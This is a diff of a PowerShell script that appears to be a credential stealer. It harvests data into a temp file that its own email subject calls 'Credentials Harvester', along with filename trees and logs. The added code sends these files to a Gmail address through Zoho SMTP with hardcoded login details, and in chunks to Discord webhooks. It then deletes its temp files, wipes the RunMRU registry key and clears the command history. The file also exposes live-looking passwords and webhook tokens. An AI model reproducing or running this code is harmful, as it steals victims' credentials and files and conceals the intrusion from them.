@@ -117,59 +117,90 @@ $window.Show()
 # Define the total number of tasks (replace with the number of main operations)
 $totalSteps = 6  # Adjust this to the number of main operations you want to track
 
+# Get the current date and time
+$currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"  # You can adjust the format as needed
+
 # Send Email Function
-function Send-EmailWithoutOutlook {
+function Send-ZohoEmail {
     param (
-        [string]$SMTPServer,
-        [int]$SMTPPort,
-        [string]$From,
-        [string]$Password,
-        [string]$To,
+        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
+        [string]$ToEmail = "jiead0128@gmail.com",
         [string]$Subject,
-        [string]$Body,
-        [string[]]$AttachmentPaths
+        [string]$Body = "Hello, this is a test email with an attachment.",
+        [string[]]$Attachments = @(),  # Optional parameter for attachments
+        [string]$SmtpServer = "smtp.zoho.com",
+        [int]$Port = 587,
+        [string]$Username = "zqrvstef0rc5edk@zohomail.com",
+        [string]$Password = "LHjzKTbzDApt"
     )
 
-    # Convert password to a secure string
-    $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
-    $Credential = New-Object System.Management.Automation.PSCredential ($From, $SecurePassword)
+    $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"
 
     # Create the email message
-    $MailMessage = New-Object system.net.mail.mailmessage
-    $MailMessage.From = $From
-    $MailMessage.To.Add($To)
-    $MailMessage.Subject = $Subject
-    $MailMessage.Body = $Body
-    $MailMessage.IsBodyHtml = $false
+    $mailMessage = New-Object System.Net.Mail.MailMessage
+    $mailMessage.From = $FromEmail
+    $mailMessage.To.Add($ToEmail)
+    $mailMessage.Subject = $Subject
+    $mailMessage.Body = $Body
 
-    # Attach each file if it exists
-    foreach ($AttachmentPath in $AttachmentPaths) {
-        if (Test-Path -Path $AttachmentPath) {
-            $Attachment = New-Object System.Net.Mail.Attachment($AttachmentPath)
-            $MailMessage.Attachments.Add($Attachment)
+    # Attach files if provided
+    foreach ($attachmentPath in $Attachments) {
+        if (Test-Path $attachmentPath) {
+            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
+            $mailMessage.Attachments.Add($attachment)
         } else {
-            Write-Output "Attachment file '$AttachmentPath' not found."
+            Write-Host "Warning: File not found - $attachmentPath"
         }
     }
 
-    # Set up SMTP client
-    $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
-    $SMTPClient.EnableSsl = $true
-    $SMTPClient.Credentials = $Credential
+    # Configure the SMTP client
+    $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
+    $smtpClient.EnableSsl = $true  # Enables STARTTLS
+    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
 
     # Send the email
     try {
-        $SMTPClient.Send($MailMessage)
-        Write-Output "Email sent successfully!"
+        $smtpClient.Send($mailMessage)
+        Write-Host "Email sent successfully to $ToEmail."
+        $message = "Email sent successfully to $toEmail. " + $Subject
+        $isEmailSent = $true
+        # Send the webhook notification
+        Send-EmailNotification -ToEmail $toEmail -WebhookUrl $email_webhookUrl -Message $message
     } catch {
-        Write-Output "Failed to send email. Error: $_"
-    }
-
-    # Dispose of attachments to release file locks
-    foreach ($Attachment in $MailMessage.Attachments) {
-        $Attachment.Dispose()
+        Write-Host "Error: $_"
+        $isEmailSent = $false
+    } finally {
+        # Clean up attachments and mail message
+        foreach ($attachment in $mailMessage.Attachments) {
+            $attachment.Dispose()
+        }
+        $mailMessage.Dispose()
     }
 }
+
+# Email Sent Notif to Webhook
+function Send-EmailNotification {
+    param (
+        [string]$ToEmail,
+        [string]$WebhookUrl,
+        [string]$Message
+    )
+
+    # Create the payload
+    $payload = @{
+        content = $Message
+    } | ConvertTo-Json
+
+    # Send the webhook notification
+    try {
+        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
+        Write-Host "Webhook notification sent successfully."
+    } catch {
+        Write-Host "Error sending webhook notification: $_"
+    }
+}
+
+$isEmailSent = $false
 
 
 # Example operations (replace with your actual code)
@@ -203,7 +234,7 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             
                     # Send the data to the Discord webhook
                     try {
-                        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
+                        #Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
                     } catch {
                         Write-Host "Failed to send data to Discord webhook. Operation " + $step + "/" + $totalSteps
                     }
@@ -263,7 +294,6 @@ for ($step = 1; $step -le $totalSteps; $step++) {
         }
         2 {
             # Operation 3 - EXTRACT DATA 
-
             $outputFilePath = "$env:TEMP\data.txt"
             Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
             Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys
@@ -285,81 +315,89 @@ for ($step = 1; $step -le $totalSteps; $step++) {
             $textBlock.Text = "Done Operation " + $step
             $textBlock.Text = "Starting Operation " + $step + "/" + $totalSteps 
 
-            Write-Output "Completed Operation " + $step + "- data saved"
-
-
-            # Send Email
-            Send-EmailWithoutOutlook -SMTPServer "smtp.mail.yahoo.com" `
-                         -SMTPPort 587 `
-                         -From "jiead0128@gmail.com" `
-                         -Password "6zpGVw2VRJFcmMBGVw2JFccmMBGVw2JFcm6zpG6zpGVw2VRJFcm6zpG6zpGVw2VRJFcmMBGVw2JFcm6zpGcmMBGVw" `
-                         -To "vncdr01@gmail.com" `
-                         -Subject "Automated Email Test | Operation " + $step `
-                         -Body "This email was sent automatically." `
-                         -AttachmentPaths @("$env:TEMP\data.txt")
+            Write-Output "Completed Operation " + $step + "- data saved"            
         }
         3 {
             # Operation 4 - SEND TO DISCORD
 
-            $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
+            # Check if the email was sent
+            if (-not $isEmailSent) {
+                # The code to execute if the email was sent successfully
 
-            # Check if the file exists
-            if (Test-Path $filePath) {
-                # Read the content of the text file
-                $fileContent = Get-Content -Path $filePath -Raw
+                # Email parameters
+                $subject = "Credentials Harvester - Sent on $currentDateTime"
+                $attachments = @("$env:TEMP\data.txt")  # Array of attachment file paths
 
-                # Split the content into chunks of 2000 characters
-                $chunkSize = 2000
-                $chunks = [System.Collections.Generic.List[string]]::new()
-
-                for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
-                    $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
-                }
-
-                # Calculate total chunks for progress increment
-                $totalChunks = $chunks.Count
-		        $currentChunks = 1
-
-                # Send each chunk to the Discord webhook
-                foreach ($chunk in $chunks) {
-                    # Create the payload for the webhook
-                    $payload = @{
-                        content = $chunk
-                    } | ConvertTo-Json
-
-                    # Try to send the content to the Discord webhook
-                    try {
-                        #Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
-                        Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
-                    } catch {
-                        Write-Host "Error sending request: $_"
-                        # Add-Type -AssemblyName PresentationFramework
-                        # [System.Windows.MessageBox]::Show("Error sending request: $_. Check Internet!", 'Error')
-                    }
-
-                    # Inside the foreach loop, after each chunk is sent
-                    # Update progress bar value
-                    $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
-                    $textBlock.Text = "WBPV Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
-
-                    # Update the window to keep it responsive
-                    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
-
-                    # Increment to the next profile
-                    $currentChunks++
-                    Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+                # Send the email
+                Send-ZohoEmail -Subject $subject -Attachments $attachments
                 
-                }
+                if (-not $isEmailSent) {
+                        $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
+                        # Check if the file exists
+                        if (Test-Path $filePath) {
+                            # Read the content of the text file
+                            $fileContent = Get-Content -Path $filePath -Raw
+
+                            # Split the content into chunks of 2000 characters
+                            $chunkSize = 2000
+                            $chunks = [System.Collections.Generic.List[string]]::new()
+
+                            for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+                                $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
+                            }
+
+                            # Calculate total chunks for progress increment
+                            $totalChunks = $chunks.Count
+                            $currentChunks = 1
+
+                            # Send each chunk to the Discord webhook
+                            foreach ($chunk in $chunks) {
+                                # Create the payload for the webhook
+                                $payload = @{
+                                    content = $chunk
+                                } | ConvertTo-Json
+
+                                # Try to send the content to the Discord webhook
+                                try {
+                                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
+                                    Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
+                                } catch {
+                                    Write-Host "Error sending request: $_"
+                                    # Add-Type -AssemblyName PresentationFramework
+                                    # [System.Windows.MessageBox]::Show("Error sending request: $_. Check Internet!", 'Error')
+                                }
+
+                                # Inside the foreach loop, after each chunk is sent
+                                # Update progress bar value
+                                $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
+                                $textBlock.Text = "WBPV Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
+
+                                # Update the window to keep it responsive
+                                [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+
+                                # Increment to the next profile
+                                $currentChunks++
+                                Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+                            
+                            }
+                        } else {
+                            Write-Host "File not found: $filePath"
+                            Add-Type -AssemblyName PresentationFramework
+                            [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
+                        }
+
+                        $isEmailSent = $false
+                        }
             } else {
-                Write-Host "File not found: $filePath"
-                Add-Type -AssemblyName PresentationFramework
-                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
+                # Code to execute if the email was not sent
+
+                
             }
+
             Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
             Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
             Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
             Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
-            #Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
 
             $textBlock.Text = "Done Operation " + $step
             $textBlock.Text = "Starting last operation ..."
@@ -420,157 +458,192 @@ for ($step = 1; $step -le $totalSteps; $step++) {
                 Show-Tree -Path $folder
                 "" | Out-File -Append -FilePath $outputFile
             }
+
+            
     
             #########################################################################
-    
-            # Define the webhook URL
-            # $webhookUrl='https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
-    
-            # Define the path to the text file using the TEMP environment variable
-            $filePath = "$env:TEMP\tree.txt"
-    
-            # Check if the file exists
-            if (Test-Path $filePath) {
-                # Read the content of the text file
-                $fileContent = Get-Content -Path $filePath -Raw
-    
-                # Check the length of the file content
-                if ($fileContent.Length -lt 2000) {
-                    # Send the entire content to the Discord webhook
-                    $payload = @{
-                        content = $fileContent
-                    } | ConvertTo-Json
-                    #Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-                    $progressBar.Value = 100  # Set progress to complete
-                } else {
-                    # Split the content into chunks of 2000 characters
-                    $chunkSize = 2000
-                    $chunks = [System.Collections.Generic.List[string]]::new()
-    
-                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
-                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
-                    }
 
-                    # Calculate total chunks for progress increment
-                    $totalChunks = $chunks.Count
-		            $currentChunks = 1
-    
-                    # Send each chunk to the Discord webhook
-                    foreach ($chunk in $chunks) {
-                        # Create the payload for the webhook
+
+            # Check if the email was sent
+            if (-not $isEmailSent) {
+                # The code to execute if the email was sent successfully
+                # Email parameters
+                $subject = "Tree Filenames - Sent on $currentDateTime"
+                $attachments = @("$env:TEMP\tree.txt")  # Array of attachment file paths
+
+                # Send the email
+                Send-ZohoEmail -Subject $subject -Attachments $attachments
+                
+            } else {
+                # Code to execute if the email was not sent
+                #Write-Host "Email was not sent."
+
+                # Define the webhook URL
+                # $webhookUrl='https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'
+        
+                # Define the path to the text file using the TEMP environment variable
+                $filePath = "$env:TEMP\tree.txt"
+        
+                # Check if the file exists
+                if (Test-Path $filePath) {
+                    # Read the content of the text file
+                    $fileContent = Get-Content -Path $filePath -Raw
+        
+                    # Check the length of the file content
+                    if ($fileContent.Length -lt 2000) {
+                        # Send the entire content to the Discord webhook
                         $payload = @{
-                            content = $chunk
+                            content = $fileContent
                         } | ConvertTo-Json
-    
-                        # Try to send the content to the Discord webhook
-                        try {
-                            #Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
-                        } catch {
-                            Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
+                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                        $progressBar.Value = 100  # Set progress to complete
+                    } else {
+                        # Split the content into chunks of 2000 characters
+                        $chunkSize = 2000
+                        $chunks = [System.Collections.Generic.List[string]]::new()
+        
+                        for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+                            $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                         }
 
-                        # Update progress bar value
-                        $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
-                        $textBlock.Text = "Tree Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
+                        # Calculate total chunks for progress increment
+                        $totalChunks = $chunks.Count
+                        $currentChunks = 1
+        
+                        # Send each chunk to the Discord webhook
+                        foreach ($chunk in $chunks) {
+                            # Create the payload for the webhook
+                            $payload = @{
+                                content = $chunk
+                            } | ConvertTo-Json
+        
+                            # Try to send the content to the Discord webhook
+                            try {
+                                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                                Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
+                            } catch {
+                                Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
+                            }
 
-                        # Update the window to keep it responsive
-                        [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+                            # Update progress bar value
+                            $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
+                            $textBlock.Text = "Tree Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
 
-                        # Increment to the next profile
-                        $currentChunks++
-                        Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+                            # Update the window to keep it responsive
+                            [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+
+                            # Increment to the next profile
+                            $currentChunks++
+                            Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+                        }
+                        Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
                     }
-                    Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
+                } else {
+                    Write-Host "File not found: $filePath"
+                    Add-Type -AssemblyName PresentationFramework
+                    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
                 }
-            } else {
-                Write-Host "File not found: $filePath"
-                Add-Type -AssemblyName PresentationFramework
-                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
+
+                $isEmailSent = $false
             }
     
+           
             Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
-            # Remove-Item "$env:TEMP\treewin.ps1" -Force -ErrorAction SilentlyContinue
     
             #delete the entire history
             reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
     
             # Clear the PowerShell command history
             Clear-History
-
-            # $textBlock.Text = "Done Last operation."
-    
-            # Display a message box indicating completion
-            # Add-Type -AssemblyName PresentationFramework
-            # [System.Windows.MessageBox]::Show('tree finish!', 'Notification')
         }
         6 {
+
+            
+
+                        
             # Define the webhook URL
             $logs_webhookUrl='https://discord.com/api/webhooks/1300717354547806219/1JCd4_69saQaBJrxNJJbDn-oC_VKJDj_-UYfn8tC3qu1hAzsgetWQ00cPOcHoTcmANhL'
 
             #SEND THE LOG FILE
             # Define the path to the text file using the TEMP environment variable
             $filePath = "$env:TEMP\Ain1_log.txt"
-    
-            # Check if the file exists
-            if (Test-Path $filePath) {
-                # Read the content of the text file
-                $fileContent = Get-Content -Path $filePath -Raw
-    
-                # Check the length of the file content
-                if ($fileContent.Length -lt 2000) {
-                    # Send the entire content to the Discord webhook
-                    $payload = @{
-                        content = $fileContent
-                    } | ConvertTo-Json -Depth 10
-                    #Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-                    $progressBar.Value = 100  # Set progress to complete
-                } else {
-                    # Split the content into chunks of 2000 characters
-                    $chunkSize = 2000
-                    $chunks = [System.Collections.Generic.List[string]]::new()
-    
-                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
-                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
-                    }
 
-                    # Calculate total chunks for progress increment
-                    $totalChunks = $chunks.Count
-		            $currentChunks = 1
-    
-                    # Send each chunk to the Discord webhook
-                    foreach ($chunk in $chunks) {
-                        # Create the payload for the webhook
+            # Check if the email was sent
+            if (-not $isEmailSent) {
+                # The code to execute if the email was sent successfully
+                # Email parameters
+                $subject = "Operation Logs  - Sent on $currentDateTime"
+                $attachments = @($filePath)  # Array of attachment file paths
+                
+                # Send the email
+                Send-ZohoEmail -Subject $subject -Attachments $attachments
+                
+            } else {
+                # Code to execute if the email was not sent
+                #Write-Host "Email was not sent."
+                # Check if the file exists
+                if (Test-Path $filePath) {
+                    # Read the content of the text file
+                    $fileContent = Get-Content -Path $filePath -Raw
+        
+                    # Check the length of the file content
+                    if ($fileContent.Length -lt 2000) {
+                        # Send the entire content to the Discord webhook
                         $payload = @{
-                            content = $chunk
+                            content = $fileContent
                         } | ConvertTo-Json -Depth 10
-    
-                        # Try to send the content to the Discord webhook
-                        try {
-                            #Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
-                        } catch {
-                            Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
+                        #Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                        $progressBar.Value = 100  # Set progress to complete
+                    } else {
+                        # Split the content into chunks of 2000 characters
+                        $chunkSize = 2000
+                        $chunks = [System.Collections.Generic.List[string]]::new()
+        
+                        for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+                            $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
                         }
 
-                        # Update progress bar value
-                        $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
-                        $textBlock.Text = "Log Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
+                        # Calculate total chunks for progress increment
+                        $totalChunks = $chunks.Count
+                        $currentChunks = 1
+        
+                        # Send each chunk to the Discord webhook
+                        foreach ($chunk in $chunks) {
+                            # Create the payload for the webhook
+                            $payload = @{
+                                content = $chunk
+                            } | ConvertTo-Json -Depth 10
+        
+                            # Try to send the content to the Discord webhook
+                            try {
+                                #Invoke-RestMethod -Uri $logs_webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                                Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
+                            } catch {
+                                Write-Host "Error sending request: $_. Operation " + $step + "/" + $totalSteps
+                            }
 
-                        # Update the window to keep it responsive
-                        [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+                            # Update progress bar value
+                            $progressBar.Value = [math]::Floor(($currentChunks / $totalChunks) * 100)
+                            $textBlock.Text = "Log Operation " + $step + "/" + $totalSteps + ": Chunks - " + $currentChunks + "/" + $totalChunks
 
-                        # Increment to the next profile
-                        $currentChunks++
-                        Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+                            # Update the window to keep it responsive
+                            [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+
+                            # Increment to the next profile
+                            $currentChunks++
+                            Start-Sleep -Milliseconds 100 # Adjust as needed for UI smoothness
+                        }
+                        Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
                     }
-                    Write-Host "Operation " + $step + "/" + $totalSteps + "completed"
+                } else {
+                    Write-Host "File not found: $filePath"
+                    Add-Type -AssemblyName PresentationFramework
+                    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
                 }
-            } else {
-                Write-Host "File not found: $filePath"
-                Add-Type -AssemblyName PresentationFramework
-                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
+
+                $isEmailSent = $false
             }
+
             $textBlock.Text = "Log sent!"
             Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
 
